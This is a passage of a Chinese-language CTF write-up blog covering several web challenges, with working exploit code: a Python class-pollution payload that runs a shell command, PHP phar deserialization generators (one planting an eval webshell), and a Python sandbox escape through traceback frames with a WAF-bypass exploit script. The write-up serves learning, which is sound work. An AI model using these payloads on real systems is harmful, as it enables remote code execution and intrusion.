class="subst">&#123;TARGET_BASE&#125;</span>/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: reg_name, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line">    s.post(<span class="string">f&quot;<span class="subst">&#123;TARGET_BASE&#125;</span>/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: reg_name, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line">    r = s.get(<span class="string">f&quot;<span class="subst">&#123;TARGET_BASE&#125;</span>/profile&quot;</span>)</span><br><span class="line">    <span class="comment"># 提取&lt;div class=&quot;rendered&quot;&gt;...&lt;/div&gt;的内容</span></span><br><span class="line">    m = re.search(<span class="string">r&#x27;&lt;div class=&quot;rendered&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>, r.text, re.DOTALL)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;未找到&lt;div class=\&quot;rendered\&quot;&gt;&quot;</span>, <span class="number">404</span></span><br><span class="line">    content = m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 查找“欢迎，”（中文逗号），并只返回后面的内容</span></span><br><span class="line">    idx = content.find(<span class="string">&quot;欢迎，&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> idx == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not Found&quot;</span>, <span class="number">404</span></span><br><span class="line">    result = content[idx + <span class="built_in">len</span>(<span class="string">&quot;欢迎，&quot;</span>) :]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not Found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> Response(result, content_type=<span class="string">&quot;text/plain; charset=utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div><p>读取env，发现hint让我那他提权</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105205150562.png"></p><h3 id="web-百年继承"><a href="#web-百年继承" class="headerlink" title="web-百年继承"></a>web-百年继承</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106174103418.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106174032893.png"></p><p>是一个py的原型链污染</p><p>首先污染execute_method</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106174336509.png"></p><p>发现让他处决失败并没有给出flag</p><p>但是发现他回显了处决失败，所以让他命令执行</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__class__&quot;: &#123;&quot;__base__&quot;: &#123;&quot;__base__&quot;: &#123;&quot;execute_method&quot;: &quot;lambda executor, target: (target.__del__(), setattr(target, &#x27;alive&#x27;, True), __import__(&#x27;subprocess&#x27;).check_output([&#x27;env&#x27;]).decode())&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106174438713.png"></p><h3 id="web-ez-seralize"><a href="#web-ez-seralize" class="headerlink" title="web-ez-seralize"></a>web-ez-seralize</h3><p>首先是一个文件读取，我们可以读取<code>index.php</code>，在index中发现了一些配置</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106174758625.png"></p><p>限制了<code>open_basedir</code></p><p>然后发现<code>require &#39;function.php&#39;;</code>也读取一下发现是类</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106174909877.png"></p><p>然后扫目录发现了<code>uploads.php</code></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106174944619.png"></p><p>通过简单分析就可以发现利用过程</p><p>首先需要根据<code>function.php</code>中的类生成一个恶意的phar文件，然后通过<code>phar://</code>伪协议来触发，最后读取<code>/tmp/flag</code>即可</p><p>链子不复杂</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$file</span>; <span class="keyword">public</span> <span class="variable">$luo</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>; <span class="keyword">public</span> <span class="variable">$test</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$b</span>; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rce_me</span>(<span class="params"></span>) </span>&#123;&#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$binvoke</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$binvoke</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$binvoke</span>-&gt;test = <span class="string">&#x27;helper&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;luo = <span class="variable">$binvoke</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$entry</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$entry</span>-&gt;test = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$entry</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$entry</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Created payload.phar\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>生成后改名为1.jpg上传</p><p>上传后看log获取文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106175502972.png"></p><p>然后phar:&#x2F;&#x2F;触发</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106175942920.png"></p><p>成功触发</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106175957087.png"></p><h3 id="web-eeeeezzzzzzZip"><a href="#web-eeeeezzzzzzZip" class="headerlink" title="web-eeeeezzzzzzZip"></a>web-eeeeezzzzzzZip</h3><p>扫目录发现源码</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106180339878.png"></p><p>拿到账号密码</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106180423369.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106180501268.png"></p><p>考点<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18584">php 文件上传不含一句 php 代码 RCE 最新新姿势-先知社区<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><p>生成恶意文件脚本</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar_file</span> = <span class="string">&#x27;exploit.phar&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt; &#x27;STUB&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    system(&#x27;echo &quot;&lt;?=eval(\$_POST[1]);&quot; &gt; 1.php&#x27;);</span></span><br><span class="line"><span class="string">    __HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHAR &#x27;<span class="subst">&#123;$phar_file&#125;</span>&#x27; created.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$gz_file</span> = <span class="string">&#x27;exploit.phar.gz&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$gz_content</span> = <span class="title function_ invoke__">gzencode</span>(<span class="variable">$phar_content</span>, <span class="number">9</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHAR content compressed to Gzip.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$gz_file</span>, <span class="variable">$gz_content</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Gzip file &#x27;<span class="subst">&#123;$gz_file&#125;</span>&#x27; created.\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251106182106823.png"></p><h3 id="web-路在脚下"><a href="#web-路在脚下" class="headerlink" title="web-路在脚下"></a>web-路在脚下</h3><p><a href="#web-%E8%B7%AF%E5%9C%A8%E8%84%9A%E4%B8%8B_revenge">web-路在脚下_revenge</a></p><h3 id="web-misc-西纳普斯的许愿碑"><a href="#web-misc-西纳普斯的许愿碑" class="headerlink" title="web-misc-西纳普斯的许愿碑"></a>web-misc-西纳普斯的许愿碑</h3><p>给出源码，是一个沙箱逃逸的题目</p><p>有个关键路由<code>/api/wishes</code></p><p><code>get</code> 是沙箱执行wishes列表中的命令</p><p><code>post</code> 是写入wishes（0.5秒会清空一次）</p><p>重点分析 wish_stone</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Wish_stone</span>(ast.NodeVisitor):</span><br><span class="line">    forbidden_wishes = &#123;</span><br><span class="line">        <span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__dict__&quot;</span>, <span class="string">&quot;__bases__&quot;</span>, <span class="string">&quot;__mro__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__code__&quot;</span>, <span class="string">&quot;__closure__&quot;</span>, <span class="string">&quot;__func__&quot;</span>, <span class="string">&quot;__self__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__module__&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>, <span class="string">&quot;__base__&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Attribute</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.attr, <span class="built_in">str</span>) <span class="keyword">and</span> node.attr <span class="keyword">in</span> <span class="variable language_">self</span>.forbidden_wishes:</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line">        <span class="variable language_">self</span>.generic_visit(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_GeneratorExp</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line">SAFE_WISHES = &#123;</span><br><span class="line">    <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">    <span class="string">&quot;filter&quot;</span>: <span class="built_in">filter</span>,</span><br><span class="line">    <span class="string">&quot;list&quot;</span>: <span class="built_in">list</span>,</span><br><span class="line">    <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">    <span class="string">&quot;addaudithook&quot;</span>: sys.addaudithook,</span><br><span class="line">    <span class="string">&quot;Exception&quot;</span>: Exception,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wish_granter</span>(<span class="params">code, result_queue</span>):</span><br><span class="line">    safe_globals = &#123;<span class="string">&quot;__builtins__&quot;</span>: SAFE_WISHES&#125;</span><br><span class="line"></span><br><span class="line">    sys.stdout = io.StringIO()</span><br><span class="line">    sys.stderr = io.StringIO()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(code, safe_globals)</span><br><span class="line">        output = sys.stdout.getvalue()</span><br><span class="line">        error = sys.stderr.getvalue()</span><br><span class="line">        <span class="keyword">if</span> error:</span><br><span class="line">            result_queue.put((<span class="string">&quot;err&quot;</span>, error))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result_queue.put((<span class="string">&quot;ok&quot;</span>, output))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        result_queue.put((<span class="string">&quot;err&quot;</span>, traceback.format_exc()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_grant</span>(<span class="params">wish: <span class="built_in">str</span>, timeout=<span class="number">3</span></span>):</span><br><span class="line">    wish = wish.encode().decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parse_wish = ast.parse(wish)</span><br><span class="line">        Wish_stone().visit(parse_wish)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: bad wish (<span class="subst">&#123;e.__class__.__name__&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    result_queue = multiprocessing.Queue()</span><br><span class="line">    p = multiprocessing.Process(target=wish_granter, args=(wish, result_queue))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join(timeout=timeout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p.is_alive():</span><br><span class="line">        p.terminate()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You wish is too long.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        status, output = result_queue.get_nowait()</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">return</span> output <span class="keyword">if</span> status == <span class="string">&quot;ok&quot;</span> <span class="keyword">else</span> <span class="string">f&quot;Error grant: <span class="subst">&#123;output&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Your wish for nothing.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CODE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def wish_checker(event,args):</span></span><br><span class="line"><span class="string">    allowed_events = [&quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;]</span></span><br><span class="line"><span class="string">    if not list(filter(lambda x: event == x, allowed_events)):</span></span><br><span class="line"><span class="string">        raise Exception</span></span><br><span class="line"><span class="string">    if len(args) &gt; 0:</span></span><br><span class="line"><span class="string">        raise Exception</span></span><br><span class="line"><span class="string">addaudithook(wish_checker)</span></span><br><span class="line"><span class="string">print(&quot;&#123;&#125;&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">badchars = <span class="string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_ .&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evaluate_wish_text</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> badchars:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ch=<span class="subst">&#123;ch&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error:waf <span class="subst">&#123;ch&#125;</span>&quot;</span></span><br><span class="line">    out = safe_grant(CODE.<span class="built_in">format</span>(text))</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure></div><p>首先在<code>evaluate_wish_text</code>会进行字符检查，通过后拼接进<code>CODE</code>后进入<code>safe_grant</code></p><p><code>safe_grant</code>先对字符进行<code>decode(&#39;unicode_escape&#39;)</code>，随后进行ast沙箱检查</p><p>检查通过后创建一个线程去执行，<code>return</code>输出</p><p>然后<code>CODE</code>是一个<code>audit hook</code></p><p>然后就是绕过了</p><p>用<code>&quot;)--内容--print(&quot;</code>就可以就可以执行代码了</p><p>在<code>safe_grant</code>中有<code>wish = wish.encode().decode(&#39;unicode_escape&#39;)</code></p><p>所以将内容进行<code>unicode</code>编码即可绕过</p><p>然后是绕过沙盒里的审计钩子。这里可以直接重写<code>len</code>方法和<code>list</code>方法,使得他们固定返回指定的bool值</p><p>然后就是ast的绕过，禁止了<strong>生成器</strong>与一些<strong>魔术属性与方法</strong>，有一个Exception，能用异常栈帧逃逸出来后把visit_Attribute扬了就可以</p><p>所以使用以下payload</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;)</span><br><span class="line">list=lambda x:True</span><br><span class="line">len=lambda x:False</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    raise Exception</span><br><span class="line">except Exception as e:</span><br><span class="line">    globals = e.__traceback__.tb_frame.f_back.f_globals</span><br><span class="line">    globals[&#x27;Wish_stone&#x27;].visit_Attribute=lambda x,y:None</span><br><span class="line">    os = globals[&quot;sys&quot;].modules[&quot;os&quot;]</span><br><span class="line">    result = os.popen(&quot;env&quot;).read()</span><br><span class="line">    print(result)</span><br><span class="line">    </span><br><span class="line">print(&quot;</span><br></pre></td></tr></table></figure></div><p>完整代码</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">获取远程 FLAG - 精简版</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://019a77e9-50a8-7842-9624-1886c8136568.geek.ctfplus.cn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_for_unicode</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Unicode Escape 编码绕过 badchars&quot;&quot;&quot;</span></span><br><span class="line">    badchars = <span class="string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_ .&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">ord</span>(c):02x&#125;</span>&quot;</span> <span class="keyword">if</span> c <span class="keyword">in</span> badchars <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload: 栈帧逃逸 + 读取环境变量</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&quot;)</span></span><br><span class="line"><span class="string">list=lambda x:True</span></span><br><span class="line"><span class="string">len=lambda x:False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">    raise Exception</span></span><br><span class="line"><span class="string">except Exception as e:</span></span><br><span class="line"><span class="string">    globals = e.__traceback__.tb_frame.f_back.f_globals</span></span><br><span class="line"><span class="string">    globals[&#x27;Wish_stone&#x27;].visit_Attribute=lambda x,y:None</span></span><br><span class="line"><span class="string">    os = globals[&quot;sys&quot;].modules[&quot;os&quot;]</span></span><br><span class="line"><span class="string">    result = os.popen(&quot;env&quot;).read()</span></span><br><span class="line"><span class="string">    print(result)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">print(&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送并立即读取</span></span><br><span class="line">requests.post(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/wishes&quot;</span>, json=&#123;<span class="string">&quot;wish&quot;</span>: escape_for_unicode(payload)&#125;)</span><br><span class="line">wishes = requests.get(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/wishes&quot;</span>).json().get(<span class="string">&#x27;wishes&#x27;</span>, [])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="keyword">if</span> wishes:</span><br><span class="line">    output = wishes[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">70</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> output.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;FLAG=&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;🎉 <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">70</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 未获取到结果&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112195408297.png"></p><p>参考链接</p><p><a class="link" target="_blank" rel="noopener" href="https://tremse.cn/2025/05/15/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#pyboxminil-2025">Python沙箱逃逸 | Tremseの部屋<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] 